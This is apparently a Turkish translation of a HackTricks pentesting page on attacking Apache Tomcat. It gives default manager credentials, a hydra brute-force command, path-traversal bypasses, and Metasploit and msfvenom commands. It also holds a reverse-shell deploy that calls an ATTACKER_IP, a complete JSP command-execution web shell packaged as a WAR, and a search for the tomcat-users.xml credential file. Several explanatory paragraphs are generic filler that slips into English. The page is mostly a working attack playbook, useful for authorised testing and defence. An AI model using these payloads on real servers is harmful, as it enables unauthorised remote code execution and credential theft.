# Tomcat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) alın
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Keşif

* Genellikle **port 8080** üzerinde çalışır
* **Yaygın Tomcat hatası:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Numaralandırma

### **Sürüm Belirleme**
Apache Tomcat'in sürümünü bulmak için basit bir komut çalıştırılabilir:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
Bu, belgelendirme dizini sayfasında "Tomcat" terimini arayacak ve HTML yanıtının başlık etiketindeki sürümü ortaya çıkaracaktır.

### **Yönetici Dosyalarının Konumu**
**`/manager`** ve **`/host-manager`** dizinlerinin tam konumlarını belirlemek, isimleri değiştirilebileceğinden önemlidir. Bu sayfaları bulmak için brute-force bir arama önerilir.

### **Kullanıcı Adı Saptama**
Tomcat 6'dan daha eski sürümler için kullanıcı adlarını saptamak mümkündür:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Varsayılan Kimlik Bilgileri**
**`/manager/html`** dizini özellikle hassastır çünkü WAR dosyalarının yüklenmesine ve dağıtılmasına izin verir, bu da kod yürütmesine yol açabilir. Bu dizin temel HTTP kimlik doğrulamasıyla korunur ve yaygın kimlik bilgileri şunlardır:
- admin:admin
- tomcat:tomcat
- admin:<NOTHING>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Bu kimlik bilgileri aşağıdaki komut kullanılarak test edilebilir:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Başka dikkate değer bir dizin **`/manager/status`**'dur, bu dizin Tomcat ve işletim sistemi sürümünü gösterir ve zafiyet tespitine yardımcı olur.

### **Brute Force Saldırısı**
Yönetici dizininde brute force saldırısı denemek için şunları kullanabilirsiniz:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Metasploit'e çeşitli parametreler ayarlanarak belirli bir ana bilgisayara hedeflenir.

## Yaygın Zayıflıklar

### **Parola Geri İzleme Açığı**
`/auth.jsp`'ye erişmek, uygun koşullar altında geri izlemede parolanın ortaya çıkmasına neden olabilir.

### **Çift URL Kodlama**
`mod_jk`'daki CVE-2007-1860 zayıflığı, çift URL kodlama yol geçişi sağlayarak özel olarak oluşturulmuş bir URL aracılığıyla yönetim arayüzüne izinsiz erişime olanak tanır.

Tomcat yönetim webine erişmek için: `pathTomcat/%252E%252E/manager/html`

### /examples
Apache Tomcat 4.x'ten 7.x'e kadar olan sürümler, bilgi ifşası ve cross-site scripting (XSS) saldırılarına duyarlı örnek betikler içerir. Bu kapsamlı olarak listelenen betikler, yetkisiz erişim ve potansiyel istismar için kontrol edilmelidir. [Daha fazla bilgi için buraya bakın](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Yol Geçişi Sömürüsü**
Bazı [**Tomcat'ın zayıf yapılandırmalarında**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) `/..;/` yolunu kullanarak Tomcat'ta korunan dizinlere erişebilirsiniz.

Örneğin, Tomcat yönetici sayfasına erişmek için şu şekilde erişebilirsiniz: `www.zayif.com/lalala/..;/manager/html`

Bu hileyi kullanarak korunan yolları atlamak için başka bir yol, `http://www.zayif.com/;param=value/manager/html`'ye erişmektir.


## Uzaktan Kod Çalıştırma (RCE)

Son olarak, Tomcat Web Uygulama Yöneticisine erişiminiz varsa, bir .war dosyası yükleyebilir ve dağıtabilirsiniz (kod çalıştırabilirsiniz).

### Sınırlamalar

Bir WAR dosyası dağıtabilmeniz için yeterli yetkilere (roller: **admin**, **manager** ve **manager-script**) sahip olmanız gerekecektir. Bu ayrıntılar genellikle `/usr/share/tomcat9/etc/tomcat-users.xml`'de tanımlanan _tomcat-users.xml_ dosyasında bulunabilir (sürümler arasında değişebilir) (bkz. [POST](tomcat.md#post) bölümü).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit, birçok farklı hedefe yönelik saldırıları gerçekleştirmek için kullanılan bir açık kaynaklı sızma testi aracıdır. Bu araç, siber güvenlik profesyonellerinin ağları ve sistemleri test etmek, zayıflıkları tespit etmek ve güvenlik açıklarını sömürmek için kullanılan bir dizi modül ve exploit içerir.

Metasploit, hedef sistemlere erişmek için çeşitli saldırı vektörleri kullanır. Bu vektörler arasında zayıf parola kullanımı, güvenlik açıkları, kötü amaçlı yazılım bulaşması ve sosyal mühendislik gibi yöntemler bulunur. Metasploit, bu saldırı vektörlerini kullanarak hedef sistemlere erişim sağlar ve ardından hedef sistemdeki zayıflıkları tespit eder ve sömürür.

Metasploit, kullanıcıların hedef sistemler üzerinde çeşitli saldırılar gerçekleştirmelerine olanak tanır. Bu saldırılar arasında parola kaba kuvvet saldırıları, exploit kullanarak güvenlik açıklarını sömürme, ters kabuk oluşturma ve sistemdeki verileri çalma gibi işlemler bulunur.

Metasploit, sızma testi ve güvenlik değerlendirmeleri için güçlü bir araçtır. Ancak, yasal ve etik sınırlar içinde kullanılmalıdır. Herhangi bir saldırı veya kötü niyetli faaliyet gerçekleştirmeden önce, hedef sistem sahibinin iznini almak önemlidir.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### MSFVenom Ters Kabuk

1. Dağıtmak için war dosyası oluşturun:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. `revshell.war` dosyasını yükleyin ve erişim sağlayın (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer) ile Bağlama ve ters kabuk

Bazı senaryolarda bu çalışmaz (örneğin eski sürümler için sun)

#### İndirme
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Ters Kabuk

A reverse shell is a type of shell in which the target machine initiates a connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in penetration testing and hacking activities.

To establish a reverse shell, the attacker needs to set up a listener on their machine and configure the target machine to connect back to the listener. Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine.

There are various methods to create a reverse shell, including using netcat, Python, or other scripting languages. The choice of method depends on the target machine's operating system and available tools.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing with proper authorization.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Bind Shell

Bind shell, Türkçe olarak "bağlama kabuğu" anlamına gelir. Bağlama kabuğu, hedef sistemde bir ağ bağlantısı dinleyen ve gelen bağlantıları kabul eden bir kabuk oluşturur. Bu, saldırganın hedef sistemde komutları çalıştırmasına ve sistem üzerinde tam kontrol elde etmesine olanak tanır.

Bağlama kabuğu oluşturmak için genellikle bir sunucu programı kullanılır. Bu program, belirli bir portu dinler ve gelen bağlantıları kabul eder. Saldırgan, hedef sistemdeki bu portu hedefleyen bir saldırı gerçekleştirerek bağlantıyı kurar. Bağlantı kurulduktan sonra saldırgan, hedef sistemde komutları çalıştırabilir ve sistem üzerinde istediği işlemleri gerçekleştirebilir.

Bağlama kabuğu, hedef sistemdeki ağ trafiğini dinleyerek çalışır. Bu nedenle, hedef sistemdeki güvenlik duvarı veya IDS/IPS gibi koruma mekanizmaları tarafından tespit edilebilir. Bu nedenle, bağlama kabuğu kullanırken dikkatli olunmalı ve gerekli önlemler alınmalıdır.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### [Culsterd](https://github.com/hatRiot/clusterd) Kullanımı

Culsterd, bir web uygulamasının güvenlik açıklarını tespit etmek için kullanılan bir araçtır. Bu araç, Apache Tomcat sunucusu üzerindeki zayıf noktaları keşfetmek için kullanılabilir. Culsterd, bir dizi saldırı vektörü kullanarak Tomcat sunucusunu hedef alır ve potansiyel güvenlik açıklarını ortaya çıkarır.

Culsterd, birkaç farklı saldırı modülü içerir:

- **Tomcat Manager Brute Force**: Bu modül, Tomcat sunucusuna yönetici erişimi elde etmek için brute force saldırısı gerçekleştirir. Varsayılan kullanıcı adı ve şifre kombinasyonlarını deneyerek, doğru kimlik bilgilerini bulmaya çalışır.

- **Tomcat Manager Deploy**: Bu modül, Tomcat sunucusuna kötü amaçlı bir web uygulaması yüklemek için kullanılır. Bu, sunucunun güvenlik açıklarını sömürmek için bir fırsat sağlar.

- **Tomcat Manager Undeploy**: Bu modül, Tomcat sunucusundan bir web uygulamasını kaldırmak için kullanılır. Bu, hedef sunucuda bulunan bir zayıf noktayı ortadan kaldırmak için kullanılabilir.

Culsterd, Tomcat sunucusu üzerindeki güvenlik açıklarını tespit etmek ve sömürmek için etkili bir araçtır. Ancak, yasal ve etik sınırlar içinde kullanılmalıdır.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Manuel yöntem - Web kabuğu

Bu [içerik](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) ile **index.jsp** oluşturun:
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Ayrıca bunu da yükleyebilirsiniz (yükleme, indirme ve komut yürütme izni verir): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### El ile Yöntem 2

[buradaki](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) gibi bir JSP web kabuğu edinin ve bir WAR dosyası oluşturun:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat kimlik bilgileri dosyasının adı _tomcat-users.xml_'dir.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Tomcat kimlik bilgilerini toplamanın diğer yolları:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Diğer tomcat tarama araçları

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Referanslar
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
